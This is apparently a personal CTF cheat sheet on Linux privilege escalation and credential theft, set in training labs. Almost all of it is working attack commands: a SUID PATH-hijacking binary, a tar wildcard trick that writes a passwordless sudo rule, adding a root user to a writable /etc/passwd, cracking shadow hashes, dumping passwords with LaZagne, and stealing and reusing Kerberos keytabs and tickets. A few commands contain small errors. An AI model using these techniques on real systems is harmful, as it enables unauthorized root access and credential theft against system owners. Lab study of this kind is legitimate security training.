    Path Hijacking

      ⚠️WARNING!! This process may vary depending of the CTF

      Steps

      1. Explore $PATH variable and look for a directory where you can write

      echo %PATH

      2. Write a simple script

      #include <unistd.h>
void main(){
    setuid(0);
    setgid(0);
    system("thm");
}

      3. Compile the script

      gcc path_exp.c -o exploit -w
      chmod +s exploit

      4. Find for a writeable folder under path structure

      find / -writable 2>/dev/null

      4.1. In case you can't find a directory which is un $PATH variable you can add your own with the following command

      export PATH=/tmp:$PATH

      In case you dont want to make it permanent

      PATH=/path/where/you/maliciousexecutable/is:$PATH

      5. Create the exploit to become root, must be with the same name as the C script 

      echo "/bin/bash" > thm
      chmod 777 thm

      6. Run the script 

      ./exploit

    Wildcard Abuse

      In case you found a cronjob that does the following, which in this case it's archiving all content from /home/htb-student every minute. You have found gold

      */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *

      The thing here is the use of * which in this case we can trick by creating files which have parameter names just like this

      touch --checkpoint=1
touch --checkpoint-action=exec=sh root.sh

      And the root.sh file which is the exploit

      echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

      This way the resulting command will be

      cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh

      And based on how tar works setting the checkpoint and the checkpoint action will execute the root.sh performing a modification into the sudoers file and grating our user as root privileges

    Modifyable /etc/passwd

      In some cases we may found an /etc/passwd file which can be modifyed in that case we could add a new user with SUID permisions of root 

      openssl passwd -1 -salt salt 1234
      echo "hacked:$1$salt$kqNI5AJoJdN1WgWoNslBD0:0:0:root:/root:/bin/bash" >> /etc/passwd
      su hacked 1234

      We can always remove the x in the passwd file and login as root without providing the password

    Dumping credentials

      Shadow hashes

        In case you have the necesary permission to copy /etc/passwd and /etc/shadow you could export them and use unshadow tool to merge them

        unshadow passwd shadow > unshadowed.hashes

        Then you can attempt to crack them using hashcat

        hashcat -m 1800 unshadow.hashes /usr/share/wordlists/rockyou.txt

      Common passwords

        We can use lazagne in order to look for common passwords and dump them. In order to do so we need to transfer tool into the victims computer

        Finally run the tool

        python3 lazagne.py all

      Finding kerberos tickets

        Tickets in linux systems are normally found in .keytab files an easy way to find them is by using

        find / -name *keytab* -ls 2>/dev/null

        Another way is by finding cronjobs

        crontab -l

        Another example is ccache files the path to this ones can be located by showing the content of KRB5CCNAME envrionmental variables (/tmp)

        env | grep -i krb5

        Once we found a ticket we can use klist to view information about this one

        klist -c ccname_ticket-name

      Abusing keytabs

        klist itself can be used to show which username you are using also you can use the following to show information about a ticket

        klist -k -t /opt/specialfiles/carlos.keytab

        We can impersonate a user using a ticket by using

        kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

      Extracting hashes

        We can use keytabextract.py in order to extract the hashes from a ticket

        python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

        Once you cracked the password you can simply login by using

        su carlos@inlanefreight.htb

      Loading ticket from cache

        In case you found a ticket inside /tmp you can use it by doing. First of all copy the ticket from /tmp to /root

        cp krb5cc_647401106_uN5uvk /root/

        Then export the ticket

        export KRB5CCNAME=/root/krb5cc_647401106_uN5uvk

        Check that you have exported the ticket correctly

        klist

        Finally use the exported ticket by issuing the -k flag .Example:

        smbclient //dc01/C$ -k -c ls -no-pass
